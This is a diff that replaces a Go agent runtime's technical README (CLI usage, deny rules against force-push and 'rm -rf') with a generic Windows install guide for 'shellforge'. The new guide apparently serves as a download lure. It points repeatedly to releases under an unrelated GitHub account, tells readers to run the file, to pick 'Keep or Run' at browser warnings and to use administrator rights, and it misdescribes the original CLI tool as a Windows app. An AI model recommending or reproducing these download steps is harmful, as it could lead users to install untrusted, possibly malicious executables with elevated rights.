@@ -1,207 +1,211 @@
-<div align="center">
+# 🤖 shellforge - Run Private AI Agents Locally
 
-# ShellForge
+[![Download shellforge](https://img.shields.io/badge/Download%20shellforge-Ready_to_Install-blue?style=for-the-badge)](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
 
-**Governed AI agent runtime -- single Go binary, local or cloud models.**
+## 🚀 What shellforge does
 
-[![Go](https://img.shields.io/badge/Go-1.18+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-[![Chitin](https://img.shields.io/badge/Governed_by-Chitin-green?style=for-the-badge)](https://github.com/chitinhq/chitin)
+shellforge helps you run local AI agents on your own Windows PC. It keeps your work private and gives you control over how the agent behaves.
 
-<img src="https://github.com/user-attachments/assets/a94a8a5e-dfeb-4771-a6ab-465d3c2f01f0" alt="ShellForge — Local Governed Agent Runtime" width="700">
+It is built around:
+- Ollama for local model use
+- AgentGuard for policy control
+- OpenShell for command work
+- DefenseClaw for safety checks
 
-</div>
+Use shellforge when you want:
+- local AI that stays on your machine
+- clear control over what the agent can do
+- a simple setup for daily use
+- less dependence on cloud tools
 
-## Architecture
+## 📥 Download shellforge
 
-```text
-Entry Points
-------------
-  shellforge chat -----+
-  shellforge agent ----+--> [ Agent Loop ]
-  shellforge ralph ----+
-  shellforge run <driver> --> [ CLI Driver Subprocess ]
-  shellforge serve ---------> [ Scheduler + Queue ] --> [ Agent Loop ]
+Visit this page to download shellforge for Windows:
 
-Agent Loop
-----------
-  [ Agent Loop ]
-        |
-        v
-  [ Intent Parser ]  (any format: JSON, XML, bare)
-        |
-        v  Canonical Action
-  [ Normalizer ] ---+
-                    |
-  (alt: Native Tool-Use Path) ----+
-                                  v
-                    +---------------------------+
-                    |     Governance Layer      |
-                    |                           |
-                    |  [ governance.Engine ]    |
-                    |            |  evaluate    |
-                    |            v              |
-                    |      chitin.yaml          |
-                    |        /       \          |
-                    |      deny     allow       |
-                    |       |         |         |
-                    |       v         v         |
-                    | [Correction] [ Tools ]    |
-                    +---------------------------+
-                            |         |
-          structured feedback|         |
-                            v         v
-                      [ Agent Loop ]   +--> Tool Execution
+[Download from GitHub Releases](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
 
-Tool Execution
---------------
-  8 Built-in Tools:
-    read_file  write_file  edit_file  run_shell
-    glob  grep  list_directory  search_files
+On the releases page:
+1. Open the latest release
+2. Download the Windows file
+3. Save it to your PC
+4. Run the file to start setup or launch the app
 
-LLM Providers
--------------
-  [ Agent Loop ] --> Ollama (local)  OR  Anthropic API
+If your browser asks for permission, choose Keep or Run when you trust the source and want to continue
 
-Drift Detector
---------------
-  [ Agent Loop ] --> [ Drift Detector ]
-                           |  (score below threshold)
-                           v
-                       Kill / Steer
-```
+## 🖥️ Windows setup
 
-## Getting Started
+shellforge is made for Windows users who want a local app with a simple start process.
 
-### Prerequisites
+Before you install, make sure your PC has:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- An internet connection for the first download
+- Administrator access if Windows asks for it
 
-- Go 1.18+ (for building from source)
-- [Ollama](https://ollama.com) for local model inference, or an Anthropic API key for cloud
+To install:
+1. Go to the releases page
+2. Download the latest Windows build
+3. Open the file you downloaded
+4. Follow the on-screen steps
+5. Let Windows finish the setup
+6. Start shellforge from the Start menu or the app folder
 
-### Install
+If Windows shows a security prompt, choose the option that lets you continue after you review the file source
 
-From source:
+## 🛠️ First run
 
-```bash
-git clone https://github.com/chitinhq/shellforge.git
-cd shellforge
-go build -o shellforge ./cmd/shellforge/
-```
+When you open shellforge for the first time, it may take a short time to prepare local services.
 
-Or via Homebrew:
+Do this first:
+1. Open the app
+2. Wait while it checks local AI support
+3. Let it connect to Ollama if needed
+4. Review the default agent rules
+5. Start with a small task
 
-```bash
-brew tap chitinhq/tap
-brew install shellforge
-```
+Good first tasks:
+- ask the agent to draft a note
+- ask it to sort a text file
+- ask it to explain a folder of files
+- ask it to open a safe local command
 
-### Quick Start
+If you already use Ollama, shellforge can fit into that setup and use your local model path
 
-```bash
-# Pull a model and start Ollama
-ollama pull qwen3:8b
-ollama serve
+## 🔒 Safety and control
 
-# Initialize governance in your project
-cd ~/your-project
-shellforge setup
+shellforge is built for governed use. That means it tries to keep agent actions within clear limits.
 
-# Interactive pair-programming
-shellforge chat
+It uses safety layers that help with:
+- command review
+- local policy checks
+- tool access control
+- action limits for risky steps
 
-# One-shot agent task
-shellforge agent "describe what this project does"
+This makes shellforge a good fit for users who want local AI without losing control of their system
 
-# Multi-task loop with validation
-shellforge ralph tasks.json --validate "go test ./..."
-```
+## 🧩 Core parts
 
-## CLI Commands
+These parts work together inside shellforge:
 
-| Command | Description |
-|---------|-------------|
-| `shellforge chat` | Interactive REPL with persistent conversation history |
-| `shellforge agent "prompt"` | One-shot governed agent execution |
-| `shellforge ralph tasks.json` | Stateless-iterative multi-task loop (pick, implement, validate, commit) |
-| `shellforge run <driver> "prompt"` | Run a governed CLI driver (claude, copilot, codex, gemini, openclaw, nemoclaw) |
-| `shellforge serve agents.yaml` | Daemon mode -- memory-aware agent scheduling |
-| `shellforge setup` | Create governance config and verify stack |
-| `shellforge status` | Ecosystem health check |
-| `shellforge qa [dir]` | QA analysis with tool use |
-| `shellforge report [repo]` | Status report from git + logs |
-| `shellforge scan [dir]` | DefenseClaw supply chain scan |
-| `shellforge canon "cmd"` | Parse shell command into canonical JSON |
+- Ollama: runs local models on your PC
+- AgentGuard: checks agent actions against rules
+- OpenShell: handles shell and command work
+- DefenseClaw: adds a safety layer for actions
+- Local agent loop: plans, checks, and runs tasks on your machine
 
-### Provider Flags
+You do not need to set up each part by hand for normal use. shellforge keeps the process simple for end users
 
-```bash
-shellforge chat --provider anthropic          # Cloud model via Anthropic API
-shellforge chat --model qwen3:14b             # Specific Ollama model
-shellforge agent --thinking-budget 8000 "prompt"  # Extended thinking (Sonnet/Opus)
-```
+## 📁 What you get
 
-## Governance
+A typical shellforge release includes:
+- the main Windows app
+- local agent support
+- setup files for first launch
+- safe defaults for everyday use
+- basic config files for model and tool access
 
-Every tool call passes through the governance engine before execution. Policies are defined in `chitin.yaml`:
+The app is meant to be used on your own computer, not as a shared cloud service
 
-```yaml
-mode: enforce   # enforce | monitor
+## ⚙️ Common use cases
 
-policies:
-  - name: no-force-push
-    action: deny
-    match:
-      command: "git push"
-      args_contain: ["--force"]
+Use shellforge for tasks like:
+- local note drafting
+- file review
+- simple command help
+- private AI chat
+- workspace cleanup
+- automation for small daily jobs
 
-  - name: no-destructive-rm
-    action: deny
-    match:
-      command: "rm"
-      args_contain: ["-rf"]
-```
+It works best when you want AI help and want to keep your data on your machine
 
-When a tool call is denied, the correction engine feeds structured feedback back to the model so it can self-correct rather than simply fail.
+## 🧭 Basic workflow
 
-## Key Internals
+A simple shellforge session usually follows this flow:
+1. You type a task
+2. The agent reads the request
+3. AgentGuard checks what the agent can do
+4. DefenseClaw reviews risky steps
+5. OpenShell runs allowed commands
+6. The agent returns the result
 
-| Package | Purpose |
-|---------|---------|
-| `internal/agent` | Core agent loop with tool calling, drift detection, context compaction |
-| `internal/governance` | Policy engine -- evaluates every action against `chitin.yaml` |
-| `internal/correction` | Escalating feedback for denied actions (retry budget + structured hints) |
-| `internal/intent` | Format-agnostic intent parser (JSON, XML, bare JSON, OpenAI function_call) |
-| `internal/normalizer` | Converts any tool call into a Canonical Action Representation |
-| `internal/llm` | Provider interface with Anthropic (prompt caching, native tool-use) and Ollama backends |
-| `internal/tools` | 8 governed tools: read, write, edit, glob, grep, shell, list, search |
-| `internal/ralph` | Stateless-iterative task loop with validation and auto-commit |
-| `internal/repl` | Interactive REPL with color output, shell escapes, signal handling |
-| `internal/scheduler` | Memory-aware agent queue for daemon mode |
-| `internal/orchestrator` | Sub-agent orchestration with context compression |
+This keeps the process clear and controlled
 
-## Development
+## 🧰 Troubleshooting
 
-```bash
-go build ./cmd/shellforge/
-go test ./...
-golangci-lint run
-```
+If shellforge does not start:
+- check that you downloaded the latest Windows release
+- try running the app again as administrator
+- make sure Windows has not blocked the file
+- confirm that you have enough free disk space
 
-## Part of the Chitin Platform
+If the app cannot reach local AI support:
+- check that Ollama is installed and running
+- make sure your model is available locally
+- restart shellforge after Ollama starts
+- check that no other app is using the same local port
 
-ShellForge is the local governed agent runtime. Other repos:
+If the app feels slow:
+- close other heavy apps
+- use a smaller local model
+- give your system more free memory
+- restart the app after a long session
 
-| Repo | Role | Start here if you want to… |
-|------|------|------------------------------|
-| [chitin](https://github.com/chitinhq/chitin) | Governance kernel — policy, invariants, hooks | Gate an agent you already use |
-| **shellforge** (this repo) | Local governed agent runtime | Run a governed agent end-to-end |
-| [octi](https://github.com/chitinhq/octi) | Swarm coordinator — triage, dispatch, routing | Orchestrate multiple agents |
-| [sentinel](https://github.com/chitinhq/sentinel) | Telemetry + detection on agent traces | Analyze how agents fail |
-| [llmint](https://github.com/chitinhq/llmint) | Token-economics middleware for LLM providers | Control LLM cost in Go apps |
-| [atlas](https://github.com/chitinhq/atlas) | Workspace starter kit — knowledge graphs + LLM-compiled wikis | Wrap your repos in AI-powered knowledge tooling |
+## 📝 Simple help for first-time users
 
-New to the platform? See [chitin's GETTING_STARTED.md](https://github.com/chitinhq/chitin/blob/main/GETTING_STARTED.md).
+If you are new to local AI tools, start small:
+- use short prompts
+- keep one task at a time
+- let the app finish before giving the next task
+- use files you already understand
+- check the output before you act on it
 
-## License
+That helps you learn how shellforge works without extra confusion
 
-MIT
+## 🔧 Suggested setup for best results
+
+For a smooth first run:
+- use Windows 11 if you can
+- keep at least 10 GB of free space
+- use 16 GB of RAM for larger local models
+- keep Ollama ready before you open shellforge
+- store your files in a simple folder path
+
+A stronger PC gives you faster responses and better model choices
+
+## 📌 Project focus
+
+shellforge brings together:
+- local LLM use
+- agentic AI workflows
+- Windows-friendly setup
+- governance for agent actions
+- privacy-first operation
+- security checks for tool use
+
+It is designed for people who want an AI agent that works on their own machine and follows clear rules
+
+## 🔗 Download again
+
+[Visit the shellforge releases page to download](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
+
+## 🧪 Example tasks
+
+Try shellforge with tasks such as:
+- organize files in a test folder
+- write a short summary from text you paste in
+- check a list of filenames
+- open a local file and explain its contents
+- create a simple to-do plan from your notes
+
+Start with low-risk tasks until you know how the agent behaves on your PC
+
+## 📍 Package details
+
+- Repository: shellforge
+- Platform focus: Windows
+- Local AI stack: Ollama
+- Governance layer: AgentGuard
+- Shell tool layer: OpenShell
+- Safety layer: DefenseClaw
+- Main goal: private local agent use
